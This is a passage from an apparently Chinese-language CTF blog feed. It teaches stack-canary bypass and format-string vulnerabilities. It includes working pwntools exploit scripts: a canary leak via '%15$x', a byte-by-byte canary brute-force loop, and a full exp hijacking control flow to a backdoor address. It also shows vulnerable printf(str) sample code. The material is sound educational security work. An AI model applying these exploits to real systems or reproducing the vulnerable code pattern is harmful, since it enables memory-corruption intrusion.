class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 启动要调试的二进制文件对应的进程</span><br>p = process(<span class="hljs-string">&#x27;./binary_200&#x27;</span>)<br><br><span class="hljs-comment"># 定义system函数的地址，这里需根据实际情况调整地址是否正确</span><br>system_addr = <span class="hljs-number">0x0804854d</span><br><br><span class="hljs-comment"># 发送格式化字符串，尝试获取信息（比如可能是获取canary值相关的操作）</span><br>p.sendline(<span class="hljs-string">&#x27;%15$x&#x27;</span>)<br><br><span class="hljs-comment"># 接收数据并转换为十六进制整数，注意要先将字节数据解码为字符串再转换</span><br>Canary = <span class="hljs-built_in">int</span>(p.recv().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># 构造payload，这里先构造填充的 &#x27;A&#x27; 字符串以及按格式拼接其他部分</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span> + p32(Canary) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">12</span> + p32(system_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-comment"># 发送构造好的payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><p>以下方法为进阶方法，学习参考：<a href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p><h3 id="one-by-one爆破Canary"><a href="#one-by-one爆破Canary" class="headerlink" title="one-by-one爆破Canary"></a>one-by-one爆破Canary</h3><p>学习参考：<a href="https://www.yuque.com/cyberangel/rg9gdm/cx5zci#">https://www.yuque.com/cyberangel/rg9gdm/cx5zci#</a></p><p>32位的Canary值一般放在<code>edp - 0xc</code>，这个不紧邻栈底，64位一般在<code>rbp-0x8</code>，与栈底相邻。不同编译器情况可能不同</p><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary  是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork  函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过  linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + <span class="hljs-built_in">chr</span>(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + <span class="hljs-built_in">chr</span>(i)<br>         <span class="hljs-comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(-<span class="hljs-number">1</span>)<br><br><br>canary = p[stop:start-<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure><p>关于为什么可以一字节一字节地爆破，网上地说法是，除最低字节外，从次低字节开始，往上爆破，只要正确，就不会报错。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>查一下保护，32位程序，开启了NX保护，Canary保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">__pid_t</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  init();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v3 = fork();<br>    <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      wait(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>      fun();<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们解释一下这段代码</p><ul><li>**<code>v3 = fork();</code>**在每次循环中都会调用 <code>fork</code> 系统调用创建一个新的进程，和前面介绍的一样，<code>fork</code> 会创建出子进程，并且在父进程和子进程中分别返回不同的值（父进程返回子进程 ID，子进程返回 0），然后将返回值赋给 <code>v3</code> 变量。</li><li>**<code>if (v3 &lt; 0)</code>**如果 <code>v3</code> 的值小于 0，说明 <code>fork</code> 系统调用失败了（可能由于系统资源不足等原因无法创建新进程），此时执行 <code>break</code> 语句跳出 <code>while</code> 循环。</li><li>**<code>if (v3)</code>**如果 <code>v3</code> 的值不为 0（也就是在父进程中，因为父进程中 <code>fork</code> 返回的是子进程的 ID，大于 0），会调用 <code>wait(0)</code> 函数。<code>wait</code> 函数用于让父进程阻塞等待，直到它的某个子进程结束运行，参数 <code>0</code> 表示等待任意子进程结束，并且获取子进程的退出状态等相关信息</li><li>当 <code>v3</code> 的值为 0 时，也就是在子进程中，会依次执行以下操作</li></ul><p>在上面我们可以看到，<code>mian</code>函数中存在<code>fork</code>函数，这是我们爆破Canary的关键</p><p>我看来看<code>fun</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78u</span>);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现read(0, &amp;buf, 0x78u);通过对栈段进行查看，我们可以输入0x78的内容，但是buf的空间为：0x70-0xC&#x3D;0x64，很明显可以发生栈溢出覆盖其他变量。其中v2就是保存Canary的变量。</p><p>所以我们的思路是一位一位的来爆破Canary，详细点来说使用栈溢出填充垃圾字符直到Canary，然后再尝试填充我们的Canary。若Canary正确，则进行下一位的爆破；若Canary错误，程序会执行fork重新运行。</p><p>下面是爆破Canary的通用模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置日志级别为debug，方便查看详细交互信息</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># 设置目标二进制架构为i386，操作系统为linux</span><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># 配置终端相关参数，用于后续可能的调试操作（例如结合gdb等）</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br><br><span class="hljs-comment"># 判断是本地运行还是远程运行，默认为本地运行模式</span><br>local = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 加载目标二进制文件</span><br>elf = ELF(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br><span class="hljs-keyword">if</span> local:<br>    <span class="hljs-comment"># 本地运行，启动本地的目标二进制程序进程</span><br>    p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br>    <span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br>    libc = ELF(<span class="hljs-string">&#x27;./&#x27;</span>)<br><br><span class="hljs-comment"># 接收数据直到出现&#x27;welcome\n&#x27;，确保程序准备好接收后续输入</span><br>p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br><span class="hljs-comment"># 初始化Canary值为空字节串</span><br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在爆破Canary的第&#123;&#125;位&quot;</span>.<span class="hljs-built_in">format</span>(k + <span class="hljs-number">1</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前的字符为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前payload为：&quot;</span>, payload)<br>        <span class="hljs-comment"># 发送payload给目标程序（进程或者远程服务器）</span><br>        p.send(payload)<br>        <span class="hljs-comment"># 接收目标程序返回的数据，直到出现&#x27;welcome\n&#x27;</span><br>        data = p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;sucess&quot;</span> <span class="hljs-keyword">in</span> data:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Canary is: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>其中：</p><p><code>context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;bash&#39;, &#39;-c&#39;]</code>：配置在调试等情况下要启动的终端相关参数，这里指定了如果需要启动终端时使用 <code>gnome-terminal</code>，并传递一些参数来执行命令（<code>-x</code> 表示后面跟着要执行的命令，这里是 <code>bash -c</code>，即启动一个 <code>bash</code> 子进程并执行后续的命令），通常是为了方便在利用过程中使用 <code>gdb</code> 等调试工具能在合适的终端环境下启动。</p><p>以下是本题的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置日志级别为debug，方便查看详细交互信息</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># 设置目标二进制架构为i386，操作系统为linux</span><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># 配置终端相关参数，用于后续可能的调试操作（例如结合gdb等）</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br><br><span class="hljs-comment"># 判断是本地运行还是远程运行，默认为本地运行模式</span><br>local = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 加载目标二进制文件</span><br>elf = ELF(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br><span class="hljs-keyword">if</span> local:<br>    <span class="hljs-comment"># 本地运行，启动本地的目标二进制程序进程</span><br>    p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br>    <span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br>    libc = ELF(<span class="hljs-string">&#x27;./&#x27;</span>)<br><br><span class="hljs-comment"># 接收数据直到出现&#x27;welcome\n&#x27;，确保程序准备好接收后续输入</span><br>p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br><span class="hljs-comment"># 初始化Canary值为空字节串</span><br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在爆破Canary的第&#123;&#125;位&quot;</span>.<span class="hljs-built_in">format</span>(k + <span class="hljs-number">1</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前的字符为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前payload为：&quot;</span>, payload)<br>        <span class="hljs-comment"># 发送payload给目标程序（进程或者远程服务器）</span><br>        p.send(payload)<br>        <span class="hljs-comment"># 接收目标程序返回的数据，直到出现&#x27;welcome\n&#x27;</span><br>        data = p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;sucess&quot;</span> <span class="hljs-keyword">in</span> data:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Canary is: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br>addr = <span class="hljs-number">0x0804863B</span><span class="hljs-comment">#后门函数地址</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">100</span> + canary + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">12</span> + p32(addr)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 __stack_chk_fail 的 GOT 表，再进行 ROP 利用</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2025/02/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞基础"><a href="#格式化字符串漏洞基础" class="headerlink" title="格式化字符串漏洞基础"></a>格式化字符串漏洞基础</h1><p>参考：<a href="https://www.yuque.com/cyberangel/rg9gdm/vh62v6#rVrvN">https://www.yuque.com/cyberangel/rg9gdm/vh62v6#rVrvN</a></p><h2 id="什么是格式化字符串"><a href="#什么是格式化字符串" class="headerlink" title="什么是格式化字符串"></a>什么是格式化字符串</h2><p>在我们初识C语言的时候，我们经常会使用到printf这之类的函数，printf函数的第一个参数就是一个格式化字符串，就是程序员可以使用占位符，指定格式，这些占位符用来替代后面的变量或者是数据。简单总结就是说，我们可以在一个字符串中，执行某个位置应该输出怎么样的数据，使用占位符代替，在输出的时候函数会自动按照我们指定的格式，寻找参数并以我们预想的形式输出。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>printf()函数的一般形式为:printf(“format”， 输出表列)，我们对format比较关心，看一下它的结构吧:<code>%[标志][输出最小宽度][.精度][长度]类型</code>，其中跟格式化字符串漏洞有关系的主要有以下几点:<br>1、输出最小宽度:用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。<br>2、类型:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mel">%c：输出字符，配上%n可用于向指定地址写数据。<br> <br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br> <br>%x：输出<span class="hljs-number">16</span>进制数据，如%i$x表示要泄漏偏移i处<span class="hljs-number">4</span>字节长的<span class="hljs-number">16</span>进制数据，%i$lx表示要泄漏偏移i处<span class="hljs-number">8</span>字节长的<span class="hljs-number">16</span>进制数据，<span class="hljs-number">32</span>bit和<span class="hljs-number">64</span>bit环境下一样。<br> <br>%p：输出<span class="hljs-number">16</span>进制数据，与%x基本一样，只是附加了前缀<span class="hljs-number">0</span>x，在<span class="hljs-number">32</span>bit下输出<span class="hljs-number">4</span>字节，在<span class="hljs-number">64</span>bit下输出<span class="hljs-number">8</span>字节，可通过输出字节的长度来判断目标环境是<span class="hljs-number">32</span>bit还是<span class="hljs-number">64</span>bit。<br> <br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在<span class="hljs-number">32</span>bit和<span class="hljs-number">64</span>bit环境下一样，可用于读取GOT表等信息。<br> <br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×<span class="hljs-number">10</span>$n表示将<span class="hljs-number">0x64</span>写入偏移<span class="hljs-number">10</span>处保存的指针所指向的地址（<span class="hljs-number">4</span>字节），而%$hn表示写入的地址空间为<span class="hljs-number">2</span>字节，%$hhn表示写入的地址空间为<span class="hljs-number">1</span>字节，<br><br>%$lln表示写入的地址空间为<span class="hljs-number">8</span>字节，在<span class="hljs-number">32</span>bit和<span class="hljs-number">64</span>bit环境下一样。有时，直接写<span class="hljs-number">4</span>字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br> <br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。<br></code></pre></td></tr></table></figure><p>关于printf()函数的使用，正常我们使用printf()函数应该是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br></code></pre></td></tr></table></figure><p>这是正确的使用方式，但是也有的人会这么用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br><span class="hljs-built_in">printf</span>(str)<br></code></pre></td></tr></table></figure><p>然后，悲剧就发生了，我们可以对比一下这两段代码，很明显，第二个程序中的printf()函数参数我们是可控的，我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</p><h2 id="特性一-printf-函数的参数个数不固定"><a href="#特性一-printf-函数的参数个数不固定" class="headerlink" title="特性一: printf()函数的参数个数不固定"></a>特性一: printf()函数的参数个数不固定</h2><p>我们可以利用这一特性进行越界数据的访问。我们先看一个正常的程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>;<br>    <span class="hljs-type">char</span> buf[]=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译之后运行:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>1 2 3<br></code></pre></td></tr></table></figure><p>接下来我们做一下测试，我们增加一个printf()的format参数，改为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d %d %d %x\n&quot;</span>,buf,a,b,c)<br></code></pre></td></tr></table></figure><p>编译后运行：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>1 2 3 c30000<br></code></pre></td></tr></table></figure><p>这里的c3000就是栈中处于3之下的数，所以只要我们能够控制format的，我们就可以一直读取内存数据。</p><p>上一个例子只是告诉我们可以利用%x一直读取栈内的内存数据，可是这并不能满足我们的需求，我们要的是任意地址读取，当然，这也是可以的，我们通过下面的例子进行分析:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">200</span>];<br>    fgets(str,<span class="hljs-number">200</span>,<span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以用%s来获取内存上的信息</p><h2 id="特性二-利用-n格式符写入数据"><a href="#特性二-利用-n格式符写入数据" class="headerlink" title="特性二:利用%n格式符写入数据"></a>特性二:利用%n格式符写入数据</h2><p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 